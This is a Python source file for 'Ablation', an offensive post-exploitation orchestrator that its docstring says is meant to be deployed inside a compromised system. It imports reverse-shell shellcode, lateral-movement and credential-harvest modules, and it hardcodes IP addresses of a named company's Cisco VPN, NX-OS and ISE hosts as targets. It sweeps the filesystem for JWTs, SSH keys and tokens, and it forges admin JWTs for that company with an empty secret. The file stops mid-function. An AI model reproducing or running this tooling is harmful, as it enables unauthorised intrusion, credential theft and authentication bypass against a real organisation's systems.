#!/usr/bin/env python3
"""
Ablation - Autonomous Reverse Engineering Tool

Deploy inside compromised system to autonomously reverse engineer unknown platform.

Usage:
    ./ablation              - Full autonomous analysis
    ./ablation --quick      - Quick platform fingerprint only
    ./ablation --process PID - Analyze specific process
    ./ablation --binary FILE - Analyze specific binary
    ./ablation --syscalls PID [duration] - Trace syscalls for process
    ./ablation --privesc     - Enumerate privilege escalation paths
    ./ablation --docker      - Docker enumeration
    ./ablation --k8s         - Kubernetes enumeration
    ./ablation --orka        - Orka platform enumeration
    ./ablation --containers  - Full container analysis (Docker + K8s + Orka)
    ./ablation --asa [HOST]  - Cisco ASA WebVPN enumeration
    ./ablation --jwt FILE    - JWT/cryptographic weakness analysis
    ./ablation --harbor HOST - Harbor registry enumeration
    ./ablation --arm64 FILE  - ARM64 Mach-O deep analysis
    ./ablation --java PATH   - Java .class/.jar security audit
    ./ablation --swift PATH  - Swift Mach-O binary RE
    ./ablation --lateral     - Lateral movement: creds/SSH keys/API tokens/cloud metadata/subnet scan
    ./ablation --tls [HOST]  - TLS cipher suite audit (default: MacStadium VPN targets)
    ./ablation --ios [HOST]  - Cisco IOS/IOS-XE enumeration (SNMP/TFTP/REST/Telnet)
    ./ablation --cisco-re HOST [--cisco-re-port PORT]
                             - Full Cisco RE probe suite: 38 probes across ASA/IOS/NX-OS/ISE/API
"""

import sys
import json
from pathlib import Path

# Core modules
sys.path.insert(0, str(Path(__file__).parent / 'core'))
sys.path.insert(0, str(Path(__file__).parent / 'modules'))

from platform_detect import PlatformDetector
from binary_parser import BinaryParser
from disasm_engine import DisasmEngine
from process_enum import ProcessEnumerator
from syscall_trace import SyscallTracer
from privesc_enum import PrivescEnumerator
from network_analyze import NetworkAnalyzer
from docker_enum import DockerEnumerator
from k8s_enum import K8sEnumerator
from orka_enum import OrkaEnumerator

try:
    from swift_re import SwiftREAnalyzer
    HAS_SWIFT_RE = True
except ImportError:
    HAS_SWIFT_RE = False
    SwiftREAnalyzer = None

try:
    from arm64_analyzer import ARM64Analyzer, analyze_arm64_binary
    HAS_ARM64 = True
except ImportError:
    HAS_ARM64 = False
    ARM64Analyzer = None

try:
    from jwt_crypto_analyzer import (
        JWTCryptoAnalyzer, forge_token, find_jwts_in_file,
        MACSTADIUM_IDP, MACSTADIUM_FORGE_PAYLOADS,
    )
    HAS_CRYPTO_AUDIT = True
except ImportError:
    HAS_CRYPTO_AUDIT = False
    JWTCryptoAnalyzer = None

try:
    from asa_enum import (ASAEnumerator, enumerate_macstadium_asas, MACSTADIUM_ASAS,
                           probe_asa_mpf_policy_exposure, probe_asa_botnet_url_filter_exposure,
                           probe_asa_asdm_jar_exposure, probe_cisco_java_deserialization_surface,
                           probe_asa_anyconnect_profile_download, probe_asa_mobile_vpn_surface,
                           probe_asa_ios_client_redirect_surface, probe_asa_webvpn_session_exposure)
    HAS_ASA_ENUM = True
except ImportError:
    HAS_ASA_ENUM = False
    ASAEnumerator = None
    probe_asa_mpf_policy_exposure = None
    probe_asa_botnet_url_filter_exposure = None
    probe_asa_asdm_jar_exposure = None
    probe_cisco_java_deserialization_surface = None
    probe_asa_anyconnect_profile_download = None
    probe_asa_mobile_vpn_surface = None
    probe_asa_ios_client_redirect_surface = None
    probe_asa_webvpn_session_exposure = None

try:
    from harbor_enum import HarborEnumerator
    HAS_HARBOR = True
except ImportError:
    HAS_HARBOR = False
    HarborEnumerator = None

try:
    from java_re import JavaREAnalyzer
    HAS_JAVA_RE = True
except ImportError:
    HAS_JAVA_RE = False
    JavaREAnalyzer = None

try:
    from nxos_enum import (NXOSEnumerator, enumerate_macstadium_cisco, MACSTADIUM_CISCO_TARGETS,
                            probe_nxos_bgp_evpn_control_plane, probe_nxos_vxlan_multisite_exposure,
                            probe_nxos_vdc_isolation_exposure, probe_nxos_fcoe_vsan_exposure,
                            probe_nxos_management_proxy_exposure, probe_nxos_nexus_dashboard_exposure,
                            probe_nxos_mac_arp_table_exposure, probe_nxos_ecmp_hash_exposure)
    HAS_NXOS = True
except ImportError:
    HAS_NXOS = False
    NXOSEnumerator = None
    MACSTADIUM_CISCO_TARGETS = []
    probe_nxos_bgp_evpn_control_plane = None
    probe_nxos_vxlan_multisite_exposure = None
    probe_nxos_vdc_isolation_exposure = None
    probe_nxos_fcoe_vsan_exposure = None
    probe_nxos_management_proxy_exposure = None
    probe_nxos_nexus_dashboard_exposure = None
    probe_nxos_mac_arp_table_exposure = None
    probe_nxos_ecmp_hash_exposure = None

try:
    from vergeio_enum import VergeIOEnumerator, enumerate_vergeos
    HAS_VERGEIO = True
except ImportError:
    HAS_VERGEIO = False
    VergeIOEnumerator = None

try:
    from ebpf_analyzer import eBPFAnalyzer, analyze_ebpf
    HAS_EBPF = True
except ImportError:
    HAS_EBPF = False
    eBPFAnalyzer = None

try:
    from macos_malware_re import MacOSMalwareRE
    HAS_MACOS_MALWARE = True
except ImportError:
    HAS_MACOS_MALWARE = False
    MacOSMalwareRE = None

try:
    from ise_enum import (ISEEnumerator, enumerate_macstadium_ise, MACSTADIUM_ISE_CANDIDATES,
                           probe_ise_jmx_monitoring_exposure, probe_ise_heap_dump_exposure,
                           probe_ise_legacy_api_endpoint_exposure, probe_ise_spring_framework_exposure,
                           probe_ise_nginx_auth_bypass, probe_ise_nginx_upstream_config,
                           probe_ise_concurrent_auth_race_surface, probe_ise_typed_error_fingerprint)
    HAS_ISE = True
except ImportError:
    HAS_ISE = False
    ISEEnumerator = None
    MACSTADIUM_ISE_CANDIDATES = []
    probe_ise_jmx_monitoring_exposure = None
    probe_ise_heap_dump_exposure = None
    probe_ise_legacy_api_endpoint_exposure = None
    probe_ise_spring_framework_exposure = None
    probe_ise_nginx_auth_bypass = None
    probe_ise_nginx_upstream_config = None
    probe_ise_concurrent_auth_race_surface = None
    probe_ise_typed_error_fingerprint = None

try:
    from ise_iso import ISEISOAnalyzer, analyze_iso_no_root
    HAS_ISE_ISO = True
except ImportError:
    HAS_ISE_ISO = False
    ISEISOAnalyzer = None

try:
    from macos_sysadmin import MacOSSysadminEnumerator
    HAS_MACOS_SYSADMIN = True
except ImportError:
    HAS_MACOS_SYSADMIN = False
    MacOSSysadminEnumerator = None

try:
    from elf_parser import ELFParser
    HAS_ELF_PARSER = True
except ImportError:
    HAS_ELF_PARSER = False
    ELFParser = None

try:
    from shellcode_utils import (
        detect_platform as sc_detect_platform,
        shellcode_reverse_tcp_linux_x86_64,
        shellcode_reverse_tcp_linux_arm64,
        detect_bad_bytes,
        nop_sled,
    )
    HAS_SHELLCODE = True
except ImportError:
    HAS_SHELLCODE = False

try:
    from ios_enum import (IOSEnumerator, MACSTADIUM_IOS_CANDIDATES,
                           probe_ios_arm_debug_interface_exposure, probe_ios_rommon_variable_exposure,
                           probe_ios_crash_artifact_exposure, probe_ios_exception_level_disclosure,
                           probe_ios_cef_fib_exposure, probe_ios_bgp_rib_tree_exposure)
    HAS_IOS = True
except ImportError:
    HAS_IOS = False
    IOSEnumerator = None
    MACSTADIUM_IOS_CANDIDATES = []
    probe_ios_arm_debug_interface_exposure = None
    probe_ios_rommon_variable_exposure = None
    probe_ios_crash_artifact_exposure = None
    probe_ios_exception_level_disclosure = None
    probe_ios_cef_fib_exposure = None
    probe_ios_bgp_rib_tree_exposure = None

try:
    from podman_enum import PodmanEnumerator, enumerate_podman, find_podman_sockets
    HAS_PODMAN = True
except ImportError:
    HAS_PODMAN = False
    PodmanEnumerator = None

try:
    from lateral_movement import (LateralMovementScanner,
                                   LateralMovementEnumerator,
                                   enumerate_lateral_movement)
    HAS_LATERAL = True
except ImportError:
    HAS_LATERAL = False
    LateralMovementScanner = None
    LateralMovementEnumerator = None

try:
    from tls_analyzer import TLSAnalyzer
    HAS_TLS = True
except ImportError:
    HAS_TLS = False
    TLSAnalyzer = None

try:
    from nginx_enum import NginxEnumerator, enumerate_macstadium_nginx
    HAS_NGINX = True
except ImportError:
    HAS_NGINX = False
    NginxEnumerator = None

try:
    from hyperflex_enum import probe_hx_connect, enumerate_hyperflex_cluster
    HAS_HYPERFLEX = True
except ImportError:
    HAS_HYPERFLEX = False

try:
    from streaming_enum import (enumerate_streaming_surface, kafka_list_topics,
                                 flink_enumerate, nifi_enumerate,
                                 schema_registry_enumerate)
    HAS_STREAMING = True
except ImportError:
    HAS_STREAMING = False

try:
    from nexus_dashboard_enum import probe_nexus_dashboard, enumerate_nexus_dashboard
    HAS_NEXUS_DASH = True
except ImportError:
    HAS_NEXUS_DASH = False

try:
    from cisco_api_enum import (enumerate_cisco_api_surface, APICEnum,
                                 DNACEnum, UCSMgrEnum, VManageEnum,
                                 RESTCONFEnum, NSOEnum,
                                 probe_aci_microsegmentation_exposure, probe_aci_tenant_network_topology,
                                 probe_cisco_nginx_proxy_exposure, probe_cisco_api_gateway_bypass,
                                 probe_cisco_crosswork_telemetry_exposure, probe_cisco_tetration_analytics_exposure,
                                 probe_cisco_catalyst_center_mobile_api, probe_cisco_umbrella_api_exposure)
    HAS_CISCO_API = True
except ImportError:
    HAS_CISCO_API = False
    probe_aci_microsegmentation_exposure = None
    probe_aci_tenant_network_topology = None
    probe_cisco_nginx_proxy_exposure = None
    probe_cisco_api_gateway_bypass = None
    probe_cisco_crosswork_telemetry_exposure = None
    probe_cisco_tetration_analytics_exposure = None
    probe_cisco_catalyst_center_mobile_api = None
    probe_cisco_umbrella_api_exposure = None

try:
    from net_sniffer import RawSniffer, sniff_network
    HAS_NET_SNIFFER = True
except ImportError:
    HAS_NET_SNIFFER = False
    RawSniffer = None

try:
    from attck_tagger import tag_findings_list
    HAS_ATTCK = True
except ImportError:
    HAS_ATTCK = False
    tag_findings_list = None

try:
    import sys as _sys
    _sys.path.insert(0, str(__file__ and __import__('pathlib').Path(__file__).parent.parent / 'core'))
    from pe_parser import PEParser, scan_pe_file
    HAS_PE_PARSER = True
except (ImportError, Exception):
    HAS_PE_PARSER = False
    PEParser = None
    scan_pe_file = None


class Ablation:
    """Main reverse engineering orchestrator"""
    
    def __init__(self):
        self.platform = None
        self.processes = []
        self.binaries = []
        self.findings = {
            'platform': {},
            'processes': [],
            'binaries': [],
            'vulnerabilities': [],
            'interesting': [],
            'privesc_paths': [],
            'network': {},
            'docker': {},
            'kubernetes': {},
            'orka': {},
            'swift_re': {},
            'java_re': {},
            'crypto_audit': {},
            'asa': {},
            'nxos': {},
            'vergeio': {},
            'ebpf': {},
            'ise': {},
            'macos_malware': {},
            'macos_sysadmin': {},
            'lateral_movement': {},
            'tls': {},
            'ios': {},
            'podman': {},
            'nginx': {},
            'hyperflex': {},
            'streaming': {},
            'nexus_dashboard': {},
            'cisco_api': {},
            'net_sniffer': {},
            'cisco_re': {},
        }
        self.version = "2.12.0"
    
    def banner(self):
        """Display banner"""
        print(r"""
    ___    __    __    ___  ___________  ____  _  __
   / _ |  / /   / /   / _ |/_  __/  _/ |/ / | / /
  / __ | / _ \ / /__ / __ | / /  _/ //    /  |/ / 
 /_/ |_|/_.__//____//_/ |_|/_/ /___/_/|_/_/|___/  
                                                   
 Autonomous Reverse Engineering Tool v{}
 Deploy INSIDE systems | Zero dependencies
        """.format(self.version))
    
    def run_autonomous(self):
        """Full autonomous analysis"""
        self.banner()
        print("[*] Ablation - Autonomous Mode")
        print("[*] Analyzing compromised system...")
        print()
        
        # Step 1: Platform detection
        print("[1/13] Platform Detection")
        self.detect_platform()
        print(f"  OS: {self.findings['platform']['os']} {self.findings['platform']['arch_bits']}bit")
        print(f"  Kernel: {self.findings['platform'].get('kernel', 'N/A')}")
        print()
        
        # Step 2: Process enumeration
        print("[2/13] Process Enumeration")
        self.enumerate_processes()
        print(f"  Found {len(self.findings['processes'])} running processes")
        print()
        
        # Step 3: Binary discovery
        print("[3/13] Binary Discovery")
        self.discover_binaries()
        print(f"  Found {len(self.findings['binaries'])} interesting binaries")
        print()
        
        # Step 4: Network analysis
        print("[4/13] Network Analysis")
        self.analyze_network()
        print(f"  Interfaces: {len(self.findings['network'].get('interfaces', []))}")
        print(f"  Listening: {len(self.findings['network'].get('listening', []))}")
        print()
        
        # Step 5: Container/platform enumeration
        print("[5/13] Container/Platform Enumeration")
        self.enumerate_containers()
        docker_info = self.findings['docker']
        k8s_info = self.findings['kubernetes']
        orka_info = self.findings['orka']
        
        if docker_info.get('in_container') or docker_info.get('socket_access'):
            print(f"  Docker: In container={docker_info.get('in_container')}, Socket={docker_info.get('socket_access')}")
        if k8s_info.get('in_k8s'):
            print(f"  Kubernetes: Namespace={k8s_info.get('namespace')}")
        if orka_info.get('in_orka_vm') or orka_info.get('orka_api_reachable'):
            print(f"  Orka: VM={orka_info.get('in_orka_vm')}, API={orka_info.get('orka_api_reachable')}")
        print()
        
        # Step 6: Vulnerability hunting
        print("[6/13] Vulnerability Analysis")
        self.hunt_vulnerabilities()
        print(f"  Identified {len(self.findings['vulnerabilities'])} potential vulnerabilities")
        print()

        # Step 7: Privilege escalation paths
        print("[7/13] Privilege Escalation Enumeration")
        self.enumerate_privesc()
        print(f"  Found {len(self.findings['privesc_paths'])} potential paths")
        print()
        
        # Step 8: macOS malware IOC / persistence / TCC (Darwin only)
        if self.findings['platform'].get('os') in ('Darwin', 'macOS'):
            print("[8/13] macOS Malware RE / Persistence / TCC")
            self.analyze_macos_malware()
            mm = self.findings['macos_malware']
            fc = mm.get('finding_count', 0)
            print(f"  Malware IOC findings: {fc}")
            self.enumerate_macos_sysadmin()
            ms = self.findings['macos_sysadmin']
            kc = len(ms.get('keychain', {}).get('entries', []))
            su = len(ms.get('sudo', {}).get('nopasswd_rules', []))
            print(f"  Sysadmin: keychain entries={kc}, sudo NOPASSWD={su}")
            print()
        else:
            print("[8/13] macOS RE — skipped (non-Darwin)")
            print()

        # Step 9: Swift binary RE (macOS/iOS targets)
        if self.findings['platform'].get('os') in ('Darwin', 'macOS') or \
           any('swift' in b.get('path', '').lower() or 'orka' in b.get('path', '').lower()
               for b in self.findings['binaries']):
            print("[9/13] Swift Binary Analysis")
            self.analyze_swift_binaries()
            sr = self.findings['swift_re']
            print(f"  Symbols: {sr.get('total_symbols', 0)}, SwiftNIO: {sr.get('swiftnio_detected', False)}, gRPC: {sr.get('grpc_detected', False)}")
            print()
        else:
            print("[9/13] Swift Analysis — skipped (non-Darwin)")
            print()

        # Step 9: Java/JVM RE
        print("[10/13] Java/JVM Analysis")
        self.analyze_java_artifacts()
        jr = self.findings['java_re']
        print(f"  Classes: {jr.get('total_classes', 0)}, Frameworks: {jr.get('frameworks', [])}")
        print()

        # Step 10: Cryptographic audit
        print("[11/13] Cryptographic Audit")
        self.audit_crypto()
        ca = self.findings['crypto_audit']
        jwt_count = len(ca.get('jwt_findings', []))
        key_count = len(ca.get('key_material', []))
        print(f"  JWTs found: {jwt_count}, Key material: {key_count}")
        if ca.get('critical_findings'):
            for cf in ca['critical_findings'][:3]:
                print(f"  [CRIT] {cf}")
        print()

        # Step 12: Lateral movement / credential harvest
        print("[12/13] Lateral Movement & Credential Harvest")
        self.scan_lateral_movement()
        lm = self.findings['lateral_movement']
        cred_count = len(lm.get('creds', {}).get('files', []))
        key_count  = len(lm.get('ssh', {}).get('private_keys', []))
        tok_count  = len(lm.get('tokens', {}).get('tokens', []))
        print(f"  Creds: {cred_count}, SSH keys: {key_count}, API tokens: {tok_count}")
        print()

        # Step 12b: TLS cipher audit (MacStadium VPN targets)
        print("[12b/14] TLS Cipher Suite Audit")
        self.audit_tls()
        tls_results = self.findings['tls'].get('results', [])
        weak_hosts  = [r['host'] for r in tls_results if r.get('weak_ciphers')]
        print(f"  Hosts audited: {len(tls_results)}, Weak cipher hosts: {len(weak_hosts)}")
        print()

        # Step 12c: Nginx enumeration (Cisco Nexus NX-API frontend)
        print("[12c/14] Nginx Enumeration (Cisco Nexus 207.254.14.1:443)")
        self.scan_nginx()
        nginx_findings = self.findings.get('nginx', {}).get('findings', [])
        print(f"  Nginx findings: {len(nginx_findings)}")
        print()

        # Step 13: JDWP debug port scan (JVM processes)
        print("[13/14] JVM Debug Port Scan (JDWP)")
        self.scan_jdwp_processes()
        print()

        # Step 14: Generate report
        print("[14/14] Report Generation")
        report_path = self.generate_report()
        print(f"  Report saved: {report_path}")
        print()

        return self.findings
    
    def detect_platform(self):
        """Detect platform characteristics"""
        detector = PlatformDetector()
        detector.detect_all()
        self.findings['platform'] = detector.info
        self.platform = detector
        return detector.info
    
    def enumerate_processes(self):
        """Enumerate all running processes"""
        enum = ProcessEnumerator()
        procs = enum.list_all_processes()
        
        # Find interesting processes
        interesting_names = ['ssh', 'sshd', 'apache', 'nginx', 'mysql', 'postgres', 
                           'docker', 'kubelet', 'redis', 'mongo', 'sudo', 'su',
                           'containerd', 'dockerd', 'kube-proxy', 'orka']
        
        for proc in procs:
            entry = {
                'pid': proc['pid'],
                'name': proc['name'],
                'cmdline': proc['cmdline']
            }
            
            # Flag interesting ones
            if any(name in proc['name'].lower() for name in interesting_names):
                entry['interesting'] = True
                self.findings['interesting'].append({
                    'type': 'process',
                    'name': proc['name'],
                    'detail': f"PID {proc['pid']}"
                })
            
            self.findings['processes'].append(entry)
        
        return procs
    
    def discover_binaries(self):
        """Discover interesting binaries"""
        search_paths = [
            '/bin',
            '/sbin',
            '/usr/bin',
            '/usr/sbin',
            '/usr/local/bin',
            '/opt'
        ]
        
        interesting_binaries = []
        
        for path in search_paths:
            path_obj = Path(path)
            if not path_obj.exists():
                continue
            
            try:
                for binary in path_obj.iterdir():
                    if binary.is_file():
                        try:
                            parser = BinaryParser(binary)
                            info = parser.parse()
                            
                            entry = {
                                'path': str(binary),
                                'format': info['format'],
                                'bits': info.get('bits'),
                                'entry': info.get('entry_point')
                            }
                            
                            interesting_binaries.append(entry)
                            
                            if len(interesting_binaries) >= 50:
                                break
                        except:
                            pass
            except:
                pass
            
            if len(interesting_binaries) >= 50:
                break
        
        self.findings['binaries'] = interesting_binaries
        return interesting_binaries
    
    def analyze_network(self):
        """Analyze network configuration"""
        analyzer = NetworkAnalyzer()
        network_info = analyzer.enumerate_all()
        self.findings['network'] = network_info
        return network_info
    
    def enumerate_containers(self):
        """Enumerate Docker, Kubernetes, and Orka"""
        # Docker
        docker_enum = DockerEnumerator()
        self.findings['docker'] = docker_enum.enumerate_all()
        
        # Kubernetes
        k8s_enum = K8sEnumerator()
        self.findings['kubernetes'] = k8s_enum.enumerate_all()
        
        # Orka
        orka_enum = OrkaEnumerator()
        self.findings['orka'] = orka_enum.enumerate_all()
        
        return {
            'docker': self.findings['docker'],
            'kubernetes': self.findings['kubernetes'],
            'orka': self.findings['orka']
        }
    
    def hunt_vulnerabilities(self):
        """Hunt for common vulnerabilities"""
        vulns = []
        
        if self.findings['platform'].get('security'):
            sec = self.findings['platform']['security']
            
            # ASLR disabled
            if sec.get('aslr') == 'disabled':
                vulns.append({
                    'severity': 'HIGH',
                    'type': 'ASLR Disabled',
                    'description': 'Address Space Layout Randomization is disabled',
                    'impact': 'Easier exploitation of memory corruption bugs',
                    'remediation': 'Enable ASLR: echo 2 > /proc/sys/kernel/randomize_va_space'
                })
        
        # Check for ptrace availability
        if self.findings['platform'].get('capabilities', {}).get('ptrace_scope') == 0:
            vulns.append({
                'severity': 'MEDIUM',
                'type': 'Unrestricted ptrace',
                'description': 'ptrace is unrestricted (ptrace_scope=0)',
                'impact': 'Any process can debug any other process',
                'remediation': 'Restrict ptrace: echo 1 > /proc/sys/kernel/yama/ptrace_scope'
                })
        
        # Container escape vectors
        if self.findings['docker'].get('escape_vectors'):
            for vec in self.findings['docker']['escape_vectors']:
                vulns.append({
                    'severity': vec['severity'],
                    'type': f"Docker: {vec['type']}",
                    'description': vec['description'],
                    'impact': 'Container escape possible',
                    'remediation': vec.get('exploit', 'Review container configuration')
                })
        
        if self.findings['kubernetes'].get('escape_vectors'):
            for vec in self.findings['kubernetes']['escape_vectors']:
                vulns.append({
                    'severity': vec['severity'],
                    'type': f"K8s: {vec['type']}",
                    'description': vec['description'],
                    'impact': 'Pod escape possible',
                    'remediation': vec.get('exploit', 'Review pod security policy')
                })
        
        # Orka findings
        if self.findings['orka'].get('findings'):
            for finding in self.findings['orka']['findings']:
                vulns.append({
                    'severity': finding['severity'],
                    'type': f"Orka: {finding['type']}",
                    'description': finding['description'],
                    'impact': finding.get('exploit', 'Security exposure'),
                    'remediation': 'Review Orka security configuration'
                })
        
        self.findings['vulnerabilities'] = vulns
        return vulns
    
    def enumerate_privesc(self):
        """Enumerate privilege escalation paths"""
        enum = PrivescEnumerator()
        paths = enum.enumerate_all()
        self.findings['privesc_paths'] = paths
        return paths
    
    def analyze_swift_binaries(self):
        """Find and analyze Swift binaries on the system"""
        if not HAS_SWIFT_RE:
            self.findings['swift_re'] = {'error': 'swift_re module not available'}
            return

        analyzer = SwiftREAnalyzer()
        results = {
            'total_symbols': 0,
            'swiftnio_detected': False,
            'grpc_detected': False,
            'binaries': [],
            'interesting_strings': [],
            'findings': []
        }

        # Known interesting Swift binaries (Orka engine + any found in binaries list)
        swift_candidates = [
            '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
        ]
        swift_candidates += [
            b['path'] for b in self.findings['binaries']
            if b.get('format') in ('macho', 'Mach-O')
        ]

        for path in swift_candidates[:5]:
            try:
                result = analyzer.analyze(path)
                results['total_symbols'] += result.get('swift_symbol_count', 0)
                grpc_svcs = result.get('grpc_services', [])
                results['swiftnio_detected'] = results['swiftnio_detected'] or any(
                    'NIO' in s.get('service_name', '') for s in grpc_svcs
                )
                results['grpc_detected'] = results['grpc_detected'] or bool(grpc_svcs)
                results['interesting_strings'].extend(result.get('security_strings', [])[:10])
                results['findings'].extend(result.get('findings', []))
                results['binaries'].append({'path': path, 'grpc_services': grpc_svcs,
                                            'vapor_routes': result.get('vapor_routes', []),
                                            'swift_sections': result.get('swift_sections', {})})
            except Exception as e:
                results['binaries'].append({'path': path, 'error': str(e)})

        self.findings['swift_re'] = results

    def analyze_java_artifacts(self):
        """Find and analyze Java class files and JARs"""
        if not HAS_JAVA_RE:
            self.findings['java_re'] = {'error': 'java_re module not available'}
            return

        analyzer = JavaREAnalyzer()
        paths = analyzer.scan_for_class_files()

        all_results = {
            'total_classes': 0,
            'frameworks': [],
            'dangerous_calls': [],
            'config_secrets': [],
            'findings': []
        }

        for path in paths[:10]:
            try:
                result = analyzer.analyze(path)
                all_results['total_classes'] += result.get('class_count', 0)
                all_results['frameworks'] = list(set(
                    all_results['frameworks'] + result.get('frameworks', [])
                ))
                all_results['dangerous_calls'].extend(result.get('dangerous_calls', []))
                all_results['config_secrets'].extend(result.get('config_secrets', []))
                all_results['findings'].extend(result.get('findings', []))
            except Exception:
                pass

        self.findings['java_re'] = all_results

    def audit_crypto(self):
        """Run cryptographic audit on the system — JWT/SAML/key material scan."""
        if not HAS_CRYPTO_AUDIT:
            self.findings['crypto_audit'] = {'error': 'jwt_crypto_analyzer module not available'}
            return

        auditor  = JWTCryptoAnalyzer()
        result   = {'jwt_findings': [], 'key_material': [], 'forged_tokens': []}
        critical = []

        # Scan interesting files for embedded JWTs
        scan_paths = [
            '/etc', '/var/log', '/tmp',
            str(Path.home() / '.kube'),
            str(Path.home() / '.config'),
        ]
        for sp in scan_paths:
            try:
                for p in Path(sp).rglob('*.json'):
                    fres = auditor.analyze_file(str(p))
                    if fres['tokens_found']:
                        result['jwt_findings'].append(fres)
                        for f in fres['findings']:
                            if f['severity'] == 'CRITICAL':
                                critical.append(f'{f["type"]}: {f["description"][:80]}')
            except Exception:
                pass

        # Pre-forge MacStadium admin tokens (empty secret confirmed)
        if HAS_CRYPTO_AUDIT:
            for payload in MACSTADIUM_FORGE_PAYLOADS:
                tok = forge_token(payload, secret=b'', alg='HS256')
                result['forged_tokens'].append({'payload': payload, 'token': tok})
                critical.append(f'FORGED_JWT(empty_secret): sub={payload["sub"]} → {tok[:40]}...')

        result['critical_findings'] = critical

        for vuln_str in critical:
            self.findings['vulnerabilities'].append({
                'severity':    'CRITICAL',
                'type':        'CryptoAudit',
                'description': vuln_str,
                'impact':      'Token forgery / auth bypass',
                'remediation': 'Rotate JWT secrets; enforce HS256 with >=256-bit random key',
            })

        self.findings['crypto_audit'] = result

    def enumerate_asa(self, targets=None):
        """Enumerate Cisco ASA VPN instances (MacStadium: 207.254.35.12, 207.254.16.2, 207.254.72.76)."""
        if not HAS_ASA_ENUM:
            self.findings['asa'] = {'error': 'asa_enum module not available'}
            return {}

        results = []
        hosts = targets or [cfg['host'] for cfg in MACSTADIUM_ASAS]

        for host in hosts:
            cfg  = next((c for c in MACSTADIUM_ASAS if c['host'] == host), {})
            enum = ASAEnumerator(host, name=cfg.get('name', host))
            if cfg.get('groups'):
                enum.groups = cfg['groups']
            r = enum.enumerate_all()
            r['cert_pin'] = cfg.get('cert_pin')
            results.append(r)

            # Fold ASA findings into main vuln list
            for finding in r.get('findings', []):
                if finding['severity'] in ('CRITICAL', 'HIGH'):
                    self.findings['vulnerabilities'].append({
                        'severity':    finding['severity'],
                        'type':        f'ASA: {finding["type"]}',
                        'description': finding['description'],
                        'impact':      finding.get('exploit', 'VPN/auth exposure'),
                        'remediation': 'Harden ASA WebVPN configuration',
                    })

        self.findings['asa'] = {'instances': results, 'count': len(results)}
        return self.findings['asa']

    def enumerate_nxos(self, targets=None):
        """Enumerate Cisco NX-OS, ACI/APIC, and VXLAN fabric (MacStadium 207.254.14.x)."""
        if not HAS_NXOS:
            self.findings['nxos'] = {'error': 'nxos_enum module not available'}
            return {}

        enum = NXOSEnumerator(targets=targets or MACSTADIUM_CISCO_TARGETS)
        result = enum.run()
        self.findings['nxos'] = result

        for finding in enum.findings:
            if finding.get('severity') in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    finding['severity'],
                    'type':        f"NX-OS: {finding['type']}",
                    'description': f"{finding.get('host', '')} creds={finding.get('creds', '')}",
                    'impact':      'Full fabric control / tenant enumeration / VTEP discovery',
                    'remediation': 'Rotate credentials; disable Telnet; enforce TACACS+',
                })

        return result

    def enumerate_ise(self, targets=None, username='admin', password=''):
        """Enumerate Cisco ISE 3.1: ERS/Open API, MnT version, pxGrid, RADIUS, guest portals."""
        if not HAS_ISE:
            self.findings['ise'] = {'error': 'ise_enum module not available'}
            return {}

        results = enumerate_macstadium_ise(targets=targets)
        self.findings['ise'] = {'instances': results}

        for r in results:
            for finding in r.get('findings', []):
                sev = finding.get('severity', 'INFO')
                if sev in ('CRITICAL', 'HIGH'):
                    self.findings['vulnerabilities'].append({
                        'severity':    sev,
                        'type':        f"ISE: {finding['title']}",
                        'description': finding.get('detail', '')[:200],
                        'impact':      'NAC bypass / RADIUS auth forging / network access control takeover',
                        'remediation': 'Rotate credentials; restrict ERS/Open API; disable weak RADIUS secrets',
                    })

        return self.findings['ise']

    def enumerate_vergeio(self, host: str, port: int = 443):
        """Enumerate VergeOS HCI platform (gcweb 4.0 fingerprint)."""
        if not HAS_VERGEIO:
            self.findings['vergeio'] = {'error': 'vergeio_enum module not available'}
            return {}

        result = enumerate_vergeos(host=host, port=port)
        self.findings['vergeio'] = result

        for finding in result.get('findings', []):
            if finding.get('severity') in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    finding['severity'],
                    'type':        f"VergeOS: {finding['title']}",
                    'description': finding.get('detail', ''),
                    'impact':      'HCI platform compromise / tenant isolation break / VM exfil',
                    'remediation': 'Rotate API keys; enforce IP allow-list; disable auto-create-users',
                })
        return result

    def analyze_macos_malware(self):
        """macOS-specific malware IOC scan, persistence enum, TCC audit, DYLD hijack surface."""
        if not HAS_MACOS_MALWARE:
            self.findings['macos_malware'] = {'error': 'macos_malware_re module not available'}
            return {}

        scanner = MacOSMalwareRE()
        result = scanner.run()
        self.findings['macos_malware'] = result

        for finding in result.get('findings', []):
            sev = finding.get('severity', 'INFO')
            if sev in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    sev,
                    'type':        f"macOS: {finding['title']}",
                    'description': finding.get('detail', '')[:200],
                    'impact':      'Persistence / TCC bypass / credential access / malware IOC',
                    'remediation': 'Audit LaunchAgents; harden TCC; enable SIP; review Orka service config',
                })
        return result

    def enumerate_macos_sysadmin(self):
        """macOS attack surface: keychain, dscl, launchd, ARD, FileVault, MDM, TCC, Orka paths."""
        if not HAS_MACOS_SYSADMIN:
            self.findings['macos_sysadmin'] = {'error': 'macos_sysadmin module not available'}
            return {}

        enum = MacOSSysadminEnumerator()
        result = enum.run()
        self.findings['macos_sysadmin'] = result

        for finding in result.get('findings', []):
            sev = finding.get('severity', 'INFO')
            if sev in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    sev,
                    'type':        f"macOS sysadmin: {finding['title']}",
                    'description': finding.get('detail', '')[:200],
                    'impact':      'Credential access / persistence / lateral movement',
                    'remediation': 'Rotate exposed credentials; harden remote management; restrict sudo',
                })
        return result

    def enumerate_podman_containers(self, socket_path=None, exec_oracle=False):
        """Podman socket enumeration: containers, privileged mounts, env secrets, Oracle exec."""
        if not HAS_PODMAN:
            self.findings['podman'] = {'error': 'podman_enum module not available'}
            return {}

        if socket_path:
            enum = PodmanEnumerator(socket_path=socket_path, exec_oracle=exec_oracle)
            result = enum.run(exec_oracle=exec_oracle)
            all_results = [result]
        else:
            out = enumerate_podman(exec_oracle=exec_oracle)
            all_results = out.get('results', [])

        self.findings['podman'] = {'results': all_results,
                                   'sockets': find_podman_sockets()}

        for r in all_results:
            for finding in r.get('findings', []):
                sev = finding.get('severity', 'INFO')
                if sev in ('CRITICAL', 'HIGH'):
                    self.findings['vulnerabilities'].append({
                        'severity':    sev,
                        'type':        f"Podman: {finding['title']}",
                        'description': finding.get('detail', '')[:200],
